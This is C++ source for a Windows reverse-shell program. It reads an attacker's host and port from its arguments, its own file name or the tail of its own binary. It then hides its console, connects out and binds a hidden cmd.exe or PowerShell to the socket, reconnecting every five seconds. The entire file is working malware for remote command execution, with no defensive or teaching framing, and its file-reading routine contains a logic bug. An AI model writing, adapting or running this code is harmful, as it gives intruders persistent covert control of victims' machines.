#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>
#include <shellapi.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>


using namespace std;

namespace util {
    // 将 LPWSTR 转换为 LPSTR（ANSI）
    inline INT32 ConvertLPWSTRToLPSTR(_In_ LPCWSTR lpwszStr, _Out_ string& out) {
        int bufferSize = 0;
        LPSTR lpszBuffer = nullptr;
        INT32 retCode = ERROR_SUCCESS;
        if (lpwszStr == nullptr) {
            retCode = ERROR_INVALID_ADDRESS;
            goto __ERROR__;
        }

        // 计算转换后的 ANSI 字符串长度（包括终止符）
        bufferSize = WideCharToMultiByte(
            CP_ACP,                // ANSI 代码页
            0,                     // 无特殊标志
            lpwszStr,              // 输入的宽字符字符串
            -1,                    // 自动计算输入字符串长度
            nullptr,                  // 不预先分配缓冲区
            0,                     // 仅计算长度
            nullptr, nullptr             // 忽略默认字符和标志
        );

        if (bufferSize == 0) {
            retCode = ERROR_DATA_NOT_ACCEPTED;
            goto __ERROR__;
        }

        // 分配缓冲区
        lpszBuffer = new CHAR[bufferSize];
        if (lpszBuffer == nullptr) {
            retCode = ERROR_NOT_ENOUGH_MEMORY;
            goto __ERROR__;
        }

        // 执行转换
        retCode = WideCharToMultiByte(
            CP_ACP,
            0,
            lpwszStr,
            -1,
            lpszBuffer,            // 输出缓冲区
            bufferSize,            // 缓冲区大小
            nullptr, nullptr
        );

        if (retCode == 0) {
            retCode = ERROR_DATA_NOT_ACCEPTED;
            goto __ERROR__;
        }
        retCode = ERROR_SUCCESS;
        out.clear();
        out.append(lpszBuffer);
        goto __FREE__;
    __ERROR__:
        do {} while (0);
    __FREE__:
        delete[] lpszBuffer;

        return retCode;
    }

    inline INT32 GetCommandArgs(vector<string>& out) {
        INT32 retCode = 0;
        LPWSTR* szArglist{};
        int nArgs{};
        int i{};

        szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
        if (nullptr == szArglist)
        {
            printf("CommandLineToArgvW failed\n");
            retCode = ERROR_BAD_COMMAND;
            goto __ERROR__;
        }
        else {
            for (i = 0; i < nArgs; i++) {
                string arg{};
                const auto ws = szArglist[i];
                retCode = ConvertLPWSTRToLPSTR(ws, arg);
                if (retCode != ERROR_SUCCESS) {
                    printf("ConvertLPWSTRToLPSTR failed\n");
                    goto __ERROR__;
                }
                out.push_back(arg);
            }
        }
        goto __FREE__;
    __ERROR__:
        do {} while (0);
    __FREE__:
        LocalFree(szArglist);
        return retCode;
    }
}



namespace rev {
    //const PCTSTR PATH$POWERSHELL = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
    //const PCTSTR PATH$CMD = R"(C:\WINDOWS\SYSTEM32\CMD.EXE)";

    class Shell {
    public:
        string execute{ "cmd.exe" };
        string host{};
        string port{};
        UINT16 u16Port{};
    };

    static INT32 extractCmdline(_In_ const vector<string>& args, _Out_ Shell& shell) {
        if (args.size() < 3) {
            return ERROR_BAD_ARGUMENTS;
        }
        shell.host = args[1];
        shell.port = args[2];
        if (args.size() >= 4) {
            shell.execute = args[3];
        }
        return ERROR_SUCCESS;
    }

    static INT32 extractFilename(_In_ const string& filename, _Out_ Shell& shell) {
        string buffer{};
        // to lowercase
        for (const auto ch : filename) {
            if (ch >= 'A' && ch <= 'Z') {
                buffer.push_back(ch + ('a' - 'A'));
            }
            else {
                buffer.push_back(ch);
            }
        }
        // remove ext name
        SSIZE_T dot = -1;
        for (auto i = 0; i < buffer.length(); i++) {
            const auto j = buffer.length() - i - 1;
            if (buffer[j] == '.') {
                dot = j;
                break;
            }
        }
        if (dot > 0) {
            const auto l = buffer.length();
            for (auto i = l - 1; i >= dot; i--) {
                buffer.pop_back();
            }

        }
        // find dash
        vector<SIZE_T> hyphens{};
        for (auto i = 0; i < buffer.length(); i++) {
            const auto j = buffer.length() - i - 1;
            if (buffer[j] == '-') {
                hyphens.push_back(j);
                if (hyphens.size() >= 2) {
                    break;
                }
            }
        }
        if (hyphens.size() < 2) {
            return ERROR_BAD_ARGUMENTS;
        }
        shell.port = string(buffer.data() + hyphens[0] + 1);
        shell.host = string(buffer.data() + hyphens[1] + 1, hyphens[0] - hyphens[1] - 1);
        if (hyphens[1] >= 10) {
            const auto j = hyphens[1];
            if (
                buffer[j - 10] == 'p' &&
                buffer[j - 9] == 'o' &&
                buffer[j - 8] == 'w' &&
                buffer[j - 7] == 'e' &&
                buffer[j - 6] == 'r' &&
                buffer[j - 5] == 's' &&
                buffer[j - 4] == 'h' &&
                buffer[j - 3] == 'e' &&
                buffer[j - 2] == 'l' &&
                buffer[j - 1] == 'l'
                ) {
                shell.execute = "powershell.exe";
            }
            else {
                shell.execute = "cmd.exe";
            }
        }
        return ERROR_SUCCESS;
    }

    static INT32 extractFileTail(_In_ const string& filename, _Out_ Shell& shell) {
        HANDLE hFile = INVALID_HANDLE_VALUE;
        INT32 retCode = ERROR_SUCCESS;
        BYTE* buffer = nullptr;
        DWORD filesize{};
        {
            const auto hFile = CreateFileA(
                filename.data(),
                GENERIC_READ,
                FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr
            );
            if (hFile != INVALID_HANDLE_VALUE) {
                retCode = ERROR_OPEN_FAILED;
                goto __ERROR__;
            }
        }
        {
            const auto bRet = GetFileSize(hFile, &filesize);
            if (!bRet) {
                goto __ERROR__;
            }
        }
        {
            buffer = static_cast<BYTE*>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, filesize));
            if (nullptr == buffer) {
                retCode = ERROR_NOT_ENOUGH_MEMORY;
                goto __ERROR__;
            }
        }
        {
            DWORD readsize;
            const auto bRet = ReadFile(hFile, buffer, filesize, &readsize, nullptr);
            if (!bRet || readsize != filesize) {
                retCode = ERROR_FILE_INVALID;
                goto __ERROR__;
            }
        }
        {
            size_t i = 0;
            if (buffer[filesize - 1] == '\n') {
                i = 1;
            }
            SSIZE_T start = -1, split = -1;
            for (; i < filesize; i++) {
                const auto j = filesize - i - 1;
                uint8_t c = buffer[j];
                if (c >= '0' && c <= '9')
                {
                    continue;
                }
                if (c >= 'a' && c <= 'z')
                {
                    continue;
                }
                if (c >= 'A' && c <= 'Z')
                {
                    continue;
                }
                if (c == '.' || c == '%')
                {
                    continue;
                }
                if (c == ':' && split < 0)
                {
                    split = j;
                    continue;
                }
                start = j + 1;
                break;
            }
            if (split < 0 || start < 0 || split <= start)
            {
                retCode = EBADF;
                goto __ERROR__;
            }
            size_t host_length = ((split - start + 1) / 8 + 1) * 8;

            shell.host = string((char*)buffer + start, split - start);
            shell.port.clear();
            for (auto i = split + 1; i < filesize; i++) {
                const char ch = buffer[i];
                if (ch >= '0' && ch <= '9') {
                    shell.port.push_back(ch);
                }
                else {
                    break;
                }
            }
        }
        goto __FREE__;
    __ERROR__:
        do {} while (0);
    __FREE__:
        if (nullptr != buffer) {
            HeapFree(GetProcessHeap(), 0, buffer);
        }
        if (INVALID_HANDLE_VALUE != hFile) {
            CloseHandle(hFile);
        }
        return retCode;
    }

    static inline int reverse(PCTSTR cmd, PCTSTR host, PCTSTR port) {
        FreeConsole();
        LPSTR $cmd = nullptr;
        memcpy(&$cmd, &cmd, sizeof(PVOID));
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
        struct addrinfo* result = nullptr, * ptr = nullptr, hints;
        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        getaddrinfo(host, port, &hints, &result);
        ptr = result;
        SOCKET ConnectSocket = WSASocket(
            ptr->ai_family,
            ptr->ai_socktype,
            ptr->ai_protocol,
            nullptr, 0, 0
        );
        connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdInput = (HANDLE)ConnectSocket;
        si.hStdOutput = (HANDLE)ConnectSocket;
        si.hStdError = (HANDLE)ConnectSocket;
        CreateProcess(nullptr, $cmd, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        WSACleanup();
        return 0;
    }

    static inline int reverse(const Shell& shell) {
        return reverse(shell.execute.data(), shell.host.data(), shell.port.data());
    }
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
{
    INT32 retCode = ERROR_SUCCESS;
    vector<string> args{};
    rev::Shell shell{};


    retCode = util::GetCommandArgs(args);

    if (retCode != ERROR_SUCCESS || args.size() < 1) {
        return ERROR_BAD_ARGUMENTS;
    }
    {
        retCode = rev::extractCmdline(args, shell);
        if (ERROR_SUCCESS == retCode) {
            goto __LOOP__;
        }
    }
    {
        retCode = rev::extractFilename(args[0], shell);
        if (ERROR_SUCCESS == retCode) {
            goto __LOOP__;
        }
    }
    {
        retCode = rev::extractFileTail(args[0], shell);
        if (ERROR_SUCCESS == retCode) {
            goto __LOOP__;
        }
    }
    goto __EXIT__;
__LOOP__:
    for (;;) {
        rev::reverse(shell);
        Sleep(5000);
    }
__EXIT__:
    return retCode;
}